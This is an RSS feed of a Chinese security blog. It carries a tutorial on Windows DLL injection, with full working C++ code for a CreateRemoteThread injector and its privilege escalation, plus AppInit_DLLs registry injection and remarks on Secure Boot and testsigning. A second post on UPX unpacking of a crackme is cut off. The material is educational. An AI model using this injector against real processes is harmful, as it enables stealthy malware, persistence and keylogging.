<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Boris&#39;s Blog</title>
        <link>https://id-none.github.io/</link>
        <description>Recent content on Boris&#39;s Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-CN</language>
        <lastBuildDate>Thu, 29 Aug 2024 17:26:06 +0800</lastBuildDate><atom:link href="https://id-none.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>DLL注入</title>
        <link>https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/</link>
        <pubDate>Thu, 29 Aug 2024 17:26:06 +0800</pubDate>
        
        <guid>https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/</guid>
        <description>&lt;img src="https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829171930019.png" alt="Featured image of post DLL注入" /&gt;&lt;h1 id=&#34;1-介绍&#34;&gt;1. 介绍
&lt;/h1&gt;&lt;p&gt;DLL注入指的是向运行中的其他进程强制插入特定的DLL文件。从技术细节来说，DLL注入命令其他进程自行调用LoadLibrary() API,加载（Loading）用户指定的DLL文件。DLL注入与一般DLL加载的区别在于，加载的目标进程是其自身或其他进程。下图描述了DLL注入的概念。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 116; 
			flex-basis: 279px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829171930019.png&#34; data-size=&#34;2000x1720&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829171930019.png&#34;
			width=&#34;2000&#34;
			height=&#34;1720&#34;
			srcset=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829171930019_hu14773067095575877703.png 480w, https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829171930019_hu14856352527106178973.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;从图中可以看到，myhack.dll已被强制插入notepad进程（本来notepad并不会加载myhack.dll ）。加载到notepad.exe进程中的myhack.dll与已经加载到notepad.exe进程中的DLL（kemel32.dll、user32.dll） —样，拥有访问notepad.exe进程内存的（正当的）权限，这样用户就可以做任何想做的事了（比如：向notepad添加通信功能以实现Messenger、文本网络浏览器等）。&lt;/p&gt;
&lt;p&gt;DLL被加载到进程后会自动运行DllMain()函数，用户可以把想执行的代码放到DllMain()函数，每当加载DLL时，添加的代码就会自然而然得到执行。利用该特性可修复程序Bug,或向程序添加新功能。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-jsx&#34;&gt;DLL（Dynamic Linked Library，动态链接库）被加载到进程后会自动运行DllMain()函数，用户可以把想执行的代码放到DllMain()函数，每当加载DLL时，添加的代码就会自然而然得到执行。利用该特性可修复程序Bug,或向程序添加新功能。
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
{
    switch( dwReason )
    {
        case DLL_PROCESS_ATTACH:
            // 添加想执行的代码
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;	
        case DLL_PROCESS_DETACH:
            break;	
    }

    return TRUE;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;2-dll注入示例&#34;&gt;2. DLL注入示例
&lt;/h1&gt;&lt;p&gt;使用LoadLibrary() API加载某个DLL时，该DLL中的DllMain()函数就会被调用执行。DLL注入的工作原理就是从外部促使目标进程调用LoadLibrary() API （与一般DLL加载相同），所以会强制调用执行DLL的DllMain()函数。并且，被注入的DLL拥有目标进程内存的访问权限，用户可以随意操作（修复Bug、添加功能等）。下面看一些使用DLL注入技术的示例。&lt;/p&gt;
&lt;h2 id=&#34;21-改善功能与修复bug&#34;&gt;2.1 &lt;strong&gt;改善功能与修复Bug&lt;/strong&gt;
&lt;/h2&gt;&lt;p&gt;DLL注入技术可用于改善功能与修复Bug。没有程序对应的源码，或直接修改程序比较困难时，就可以使用DLL注入技术为程序添加新功能（类似于插件），或者修改有问题的代码、数据。&lt;/p&gt;
&lt;h2 id=&#34;22-消息钩取&#34;&gt;2.2 &lt;strong&gt;消息钩取&lt;/strong&gt;
&lt;/h2&gt;&lt;p&gt;Windows OS默认提供的消息钩取功能应用的就是一种DLL注入技术。与常规的DLL注入唯一的区别是，OS会直接将已注册的钩取DLL注入目标进程。&lt;/p&gt;
&lt;h2 id=&#34;23-api-钩取&#34;&gt;2.3 &lt;strong&gt;API 钩取&lt;/strong&gt;
&lt;/h2&gt;&lt;p&gt;API钩取广泛应用于实际的项目开发，而进行API钩取时经常使用DLL注入技术。先创建好DLL形态的钩取函数，再将其轻松注入要钩取的目标进程，这样就完成了API钩取。这灵活运用了 “被注入的DLL拥有目标进程内存访问权限”这一特性&lt;/p&gt;
&lt;h2 id=&#34;24-其他应用程序&#34;&gt;2.4 &lt;strong&gt;其他应用程序&lt;/strong&gt;
&lt;/h2&gt;&lt;p&gt;DLL注入技术也应用于监视、管理PC用户的应用程序。比如，用来阻止特定程序（像游戏、股票交易等）运行、禁止访问有害网站，以及监视PC的使用等。管理员（或者父母）主要安装这类拦截/阻断应用程序来管理/监视。受管理/监视的一方当然千方百计地想关闭这些监视程序，但由于这些监视程序采用DLL注入技术，它们可以隐藏在正常进程中运行，所以管理员一般不用担心被发现或被终止（若用户强制终止Windows系统进程，也会一并关闭系统，最后也算达成了拦截/阻断这一目标）。&lt;/p&gt;
&lt;h2 id=&#34;25-恶意代码&#34;&gt;2.5 &lt;strong&gt;恶意代码&lt;/strong&gt;
&lt;/h2&gt;&lt;p&gt;恶意代码制作者们是不会置这么好的技术于不顾的，他们积极地把DLL注入技术运用到自己制作的恶意代码中。这些入把自己编写的恶意代码隐藏到正常进程（winlogon.exe、services.exe、svchost.exe、explorer.exe等），打开后门端口（ Backdoor port ），尝试从外部连接，或通过键盘偷录（Keylogging）功能将用户的个入信息盗走。只有了解恶意代码制作者们使用的手法，才能拿出相应对策&lt;/p&gt;
&lt;h1 id=&#34;3-dll注入的实现方法&#34;&gt;3. DLL注入的实现方法
&lt;/h1&gt;&lt;p&gt;向某个进程注入DLL时主要使用以下三种方法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;创建远程线程（CreateRemoteThread() API)&lt;/li&gt;
&lt;li&gt;使用注册表（AppInit_DLLs值）&lt;/li&gt;
&lt;li&gt;消息钩取（SetWindowsHookEx() API）&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;31-使用createremotethread函数进行dll注入&#34;&gt;3.1 &lt;strong&gt;使用CreateRemoteThread()函数进行DLL注入&lt;/strong&gt;
&lt;/h2&gt;&lt;p&gt;将DLL1.dll注入到notepad.exe进程中,查看PID为4644&lt;/p&gt;
&lt;p&gt;使用管理员打开cmd，然后进行dll注入&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;sudo .\\DLL注入.exe 4644 C:\\Users\\xxxxx\\Desktop\\恶意代码分析\\进程注入\\Dll1\\x64\\Debug\\Dll1.dll
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 136; 
			flex-basis: 327px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172029324.png&#34; data-size=&#34;2000x1466&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172029324.png&#34;
			width=&#34;2000&#34;
			height=&#34;1466&#34;
			srcset=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172029324_hu6560594509309568958.png 480w, https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172029324_hu9576281290531800719.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 155; 
			flex-basis: 372px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172112660.png&#34; data-size=&#34;2000x1289&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172112660.png&#34;
			width=&#34;2000&#34;
			height=&#34;1289&#34;
			srcset=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172112660_hu1419743597050033716.png 480w, https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172112660_hu13128667236335850262.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;// DLL1.dll
#include &amp;quot;windows.h&amp;quot;
#include &amp;quot;tchar.h&amp;quot;
#include &amp;quot;pch.h&amp;quot;

#pragma comment(lib, &amp;quot;urlmon.lib&amp;quot;)

HMODULE g_hMod = NULL;

DWORD WINAPI ThreadProc(LPVOID lParam)
{
	// 弹窗“Hello World!”
	MessageBox(NULL, L&amp;quot;Hello World!&amp;quot;, L&amp;quot;Message&amp;quot;, MB_OK);
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    HANDLE hThread = NULL;

    g_hMod = (HMODULE)hinstDLL;

    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH: 	//加载时
        OutputDebugString(L&amp;quot;Injection!!!&amp;quot;); //输出调试字符串
        hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); //创建线程
        CloseHandle(hThread);
        break;
    }

    return TRUE;
}
// DLL注入.cpp
#include &amp;quot;windows.h&amp;quot;
#include &amp;quot;tchar.h&amp;quot;

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
    TOKEN_PRIVILEGES tp;
    HANDLE hToken;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &amp;amp;hToken))
    {
        _tprintf(L&amp;quot;OpenProcessToken error: %u\\n&amp;quot;, GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL,           // lookup privilege on local system
        lpszPrivilege,  // privilege to lookup 
        &amp;amp;luid))        // receives LUID of privilege
    {
        _tprintf(L&amp;quot;LookupPrivilegeValue error: %u\\n&amp;quot;, GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.
    if (!AdjustTokenPrivileges(hToken,
        FALSE,
        &amp;amp;tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        _tprintf(L&amp;quot;AdjustTokenPrivileges error: %u\\n&amp;quot;, GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        _tprintf(L&amp;quot;The token does not have the specified privilege. \\n&amp;quot;);
        return FALSE;
    }

    return TRUE;
}

BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)
{
    HANDLE hProcess = NULL, hThread = NULL;
    HMODULE hMod = NULL;
    LPVOID pRemoteBuf = NULL;
    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
    LPTHREAD_START_ROUTINE pThreadProc;

    // #1. 使用 dwPID 获取目标进程(notepad.exe)句柄（PROCESS_ALL_ACCESS权限），然后就可以用 hProcess 控制进程.
    if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))
    {        //OpenProcess调用API，借助PID获取目标权限
        _tprintf(L&amp;quot;OpenProcess(%d) failed!!! [%d]\\n&amp;quot;, dwPID, GetLastError());
        return FALSE;
    }

    // #2. 在目标进程(notepad.exe) 内存中分配 szDllName 大小的内存，返回 pRemoteBuf 作为该缓冲区的地址.
    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);

    // #3. 将 myhack.dll 路径写入刚刚分配的缓冲区.
    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);

    // #4. 获取 LoadLibraryW() API 地址，kernel32.dll在每个进程中的加载地址相同（这个特性就是我们要利用的）.
    hMod = GetModuleHandle(L&amp;quot;kernel32.dll&amp;quot;);
    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, &amp;quot;LoadLibraryW&amp;quot;);

    // #5. 在 notepad.exe 中运行线程
    hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE;
}

int _tmain(int argc, TCHAR* argv[])
{
    if (argc != 3)
    {
        _tprintf(L&amp;quot;USAGE : %s &amp;lt;pid&amp;gt; &amp;lt;dll_path&amp;gt;\\n&amp;quot;, argv[0]);
        return 1;
    }

    // change privilege
    if (!SetPrivilege(SE_DEBUG_NAME, TRUE))
        return 1;

    // inject dll
    if (InjectDll((DWORD)_tstol(argv[1]), argv[2]))
        _tprintf(L&amp;quot;InjectDll(\\&amp;quot;%s\\&amp;quot;) success!!!\\n&amp;quot;, argv[2]);
    else
        _tprintf(L&amp;quot;InjectDll(\\&amp;quot;%s\\&amp;quot;) failed!!!\\n&amp;quot;, argv[2]);

    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;32-使用注册表修改appinit_dlls实现注入bios-secure-boot-已禁用&#34;&gt;3.2 使用注册表修改AppInit_DLLs实现注入（bios secure boot 已禁用）
&lt;/h2&gt;&lt;p&gt;进行DLL注入的第二种方法是使用注册表，WindowsOS的注册表中默认提供了AppInit_DLLs与LoadAppInit_DLLs两个注册表项&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 147; 
			flex-basis: 352px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172131742.png&#34; data-size=&#34;2000x1360&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172131742.png&#34;
			width=&#34;2000&#34;
			height=&#34;1360&#34;
			srcset=&#34;https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172131742_hu18446517459900913616.png 480w, https://id-none.github.io/2024/dll%E6%B3%A8%E5%85%A5/image-20240829172131742_hu8547679298402043282.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;只要将要注入DLL的路径写入AppInit_DLLs项目，并在LoadAppInit_DLLs中设置值为1，重启时，系统就会将指定的DLL注入到所有运行进程中。主要原理是User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，若值为1，就调用LoadLibrary()函数加载用户DLL。所以严格来说，是将注入DLL加载到使用user32.dll的进程中。&lt;/p&gt;
&lt;p&gt;注：Windows XP会忽略LoadAppInit_DLLs注册表项。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;// 开启secure boot后的操作
使用IDA打开Kernel32.dll 查看函数LoadAppInitDllsImplementation
void LoadAppInitDllsImplementation()
{
  struct _PEB *v0; // rax
  int v1; // [rsp+50h] [rbp+10h] BYREF
  DWORD pcbData; // [rsp+58h] [rbp+18h] BYREF
  int pvData; // [rsp+60h] [rbp+20h] BYREF
  HKEY hkey; // [rsp+68h] [rbp+28h] BYREF

  if ( !MEMORY[0x7FFE02EC] )
  {
    v0 = NtCurrentPeb();
    if ( (v0-&amp;gt;BitField &amp;amp; 2) == 0
      &amp;amp;&amp;amp; ((v0-&amp;gt;BitField &amp;amp; 0x10) == 0 &amp;amp;&amp;amp; MEMORY[0x7FFE02F0] &amp;gt;= 0 || (unsigned int)BasepIsTestSigningEnabled())
      &amp;amp;&amp;amp; (!(unsigned int)BasepIsServiceSidBlocked(&amp;amp;v1) || !v1)
      &amp;amp;&amp;amp; (!(unsigned int)BasepAreExtensionPointsBlocked(&amp;amp;v1) || !v1)
      &amp;amp;&amp;amp; !RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            L&amp;quot;Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows&amp;quot;,
            0,
            0x20019u,
            &amp;amp;hkey) )
    {
      pcbData = 4;
      if ( !RegGetValueW(hkey, 0i64, L&amp;quot;LoadAppInit_DLLs&amp;quot;, 0x10u, 0i64, &amp;amp;pvData, &amp;amp;pcbData) )
      {
        if ( pvData )
          BasepLoadAppInitDlls(hkey);
      }
      RegCloseKey(hkey);
    }
  }
}

__int64 BasepIsTestSigningEnabled()
{
  unsigned int v0; // ebx
  __int64 SystemInformation; // [rsp+30h] [rbp+8h] BYREF

  v0 = 0;
  SystemInformation = 8i64;
  if ( NtQuerySystemInformation(MaxSystemInfoClass|SystemProcessInformation, &amp;amp;SystemInformation, 8u, 0i64) &amp;gt;= 0
    &amp;amp;&amp;amp; (SystemInformation &amp;amp; 0x200000000i64) != 0 )
  {
    return 1;
  }
  return v0;
}

//   if ( NtQuerySystemInformation(MaxSystemInfoClass|SystemProcessInformation, &amp;amp;SystemInformation, 8u, 0i64) &amp;gt;= 0 &amp;amp;&amp;amp; (SystemInformation &amp;amp; 0x200000000i64) != 0 ) 判断是否为真

0x2为 CODEINTEGRITY_OPTION_TESTSIGN。这个标志可以在bcdedit中设置，命令为 bcdedit.exe –set testsigning on，用于设置系统的test mode
但是secure boot只有disable之后才能使用bcdedit设置这个Flag。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那么我在这个注册表中注入DLL1.dll，启动界面弹出好多个”Hello World“ 🤣&lt;/p&gt;
</description>
        </item>
        <item>
        <title>UPX脱壳初探(x64dbg)</title>
        <link>https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/</link>
        <pubDate>Thu, 27 Jun 2024 13:26:06 +0800</pubDate>
        
        <guid>https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/</guid>
        <description>&lt;img src="https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133422309.png" alt="Featured image of post UPX脱壳初探(x64dbg)" /&gt;&lt;h1 id=&#34;1-target-程序&#34;&gt;1. Target 程序
&lt;/h1&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://9unkk.github.io//Download/Basic/CRACKME.7z&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CRACKME&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://9unkk.github.io//Download/unpacking/CRACKME%20UPX.7z&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CRACKME UPX&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;解压密码：9unk&lt;/p&gt;
&lt;p&gt;目标：初步学习脱壳步骤，了解OEP（程序入口点）和 IAT（Import Address Table）&lt;/p&gt;
&lt;h1 id=&#34;2-壳&#34;&gt;2. 壳
&lt;/h1&gt;&lt;p&gt;PE （Poreable Executable）也就是EXE和DLL文件所具有的&lt;strong&gt;压缩、加密、保护&lt;/strong&gt;作用的东西，当然加壳也可以成为我们绕过杀软的一种方式（研究中）&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 152; 
			flex-basis: 366px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133309504.png&#34; data-size=&#34;827x542&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133309504.png&#34;
			width=&#34;827&#34;
			height=&#34;542&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133309504_hu16932659265732478200.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133309504_hu1388134159817743508.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;加壳的过程：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;将待加壳程序全部进行加密&lt;/li&gt;
&lt;li&gt;壳子程序中新增一段解密程序&lt;/li&gt;
&lt;li&gt;修改壳子程序的OEP到解密程序入口处&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;3-壳运行原理以upx为例&#34;&gt;3. 壳运行原理（以UPX为例）
&lt;/h1&gt;&lt;h3 id=&#34;首先对程序进行解密解压缩然后再执行程序&#34;&gt;首先对程序进行解密（解压缩）然后再执行程序
&lt;/h3&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 182; 
			flex-basis: 438px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133325444.png&#34; data-size=&#34;741x406&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133325444.png&#34;
			width=&#34;741&#34;
			height=&#34;406&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133325444_hu9752463926111459461.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133325444_hu3717127443536810682.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;如上图所示，PE文件使用UPX工具进行加壳（压缩），将&amp;quot;节1&amp;quot;和&amp;quot;节2&amp;quot;压缩到&amp;quot;压缩数据中&amp;quot;,并且在&amp;quot;新PE&amp;quot;中增加一段解密（解压）程序，将程序恢复。
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;4-upx加壳原理&#34;&gt;4. UPX加壳原理
&lt;/h1&gt;&lt;p&gt;UPX加壳是一种压缩与加密技术，它将可执行文件进行压缩、加密并重新包装，以达到保护程序的目的。加壳后的程序在运行时会自动解压、解密并执行原始程序。这种加壳方式可以有效防止程序被轻易反编译或修改，从而提高软件的安全性。&lt;/p&gt;
&lt;h2 id=&#34;41-upx加壳过程upx壳ultimate-packer-for-executables用于可执行文件压缩减小文件大小在运行时解压缩&#34;&gt;4.1 UPX加壳过程（UPX壳，Ultimate Packer for eXecutables，用于可执行文件压缩，减小文件大小，在运行时解压缩）
&lt;/h2&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 340; 
			flex-basis: 817px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133338999.png&#34; data-size=&#34;1522x447&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133338999.png&#34;
			width=&#34;1522&#34;
			height=&#34;447&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133338999_hu15627057886826699581.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133338999_hu17127670401019429523.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;​	初始化：进程启动后，申请内存，内部包含空节&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;先映射头部，当然也要对pe头进行操作&lt;/li&gt;
&lt;li&gt;数据映射，把解压缩代码和压缩数据映射进内存&lt;/li&gt;
&lt;li&gt;把各种表进行处理&lt;/li&gt;
&lt;li&gt;运行压缩代码，跑压缩数据&lt;/li&gt;
&lt;li&gt;还原数据，填充&lt;/li&gt;
&lt;li&gt;行完解压缩代码后，跑到节区1去执行原来的功能（会存在大跳）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 209; 
			flex-basis: 502px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134620682.png&#34; data-size=&#34;2417x1154&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134620682.png&#34;
			width=&#34;2417&#34;
			height=&#34;1154&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134620682_hu466794940457788533.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134620682_hu4206072420395285593.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;42-常见upx魔改情况&#34;&gt;4.2 常见UPX魔改情况
&lt;/h2&gt;&lt;p&gt;区段名被修改UPX → 1PX 使用010 Editor修改回去 如图&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 653; 
			flex-basis: 1567px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133745677.png&#34; data-size=&#34;712x109&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133745677.png&#34;
			width=&#34;712&#34;
			height=&#34;109&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133745677_hu15025477382756501142.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133745677_hu6133173021909086757.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;将软件通过010 Editor打开，可以发现明确的UPX头部，此时使用Die可以轻松识别，当我们修改UPX头部信息为1PX时，此时程序任然可以正常运行，使用Die识别到UPX但是无法发现具体版本信息，此时使用UPX -d 进行脱壳是失败的。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 183; 
			flex-basis: 439px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133949732.png&#34; data-size=&#34;826x451&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133949732.png&#34;
			width=&#34;826&#34;
			height=&#34;451&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133949732_hu10593901304641541934.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628133949732_hu14627091256183345765.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 439; 
			flex-basis: 1054px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134122450.png&#34; data-size=&#34;1094x249&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628134122450.png&#34;
			width=&#34;1094&#34;
			height=&#34;249&#34;
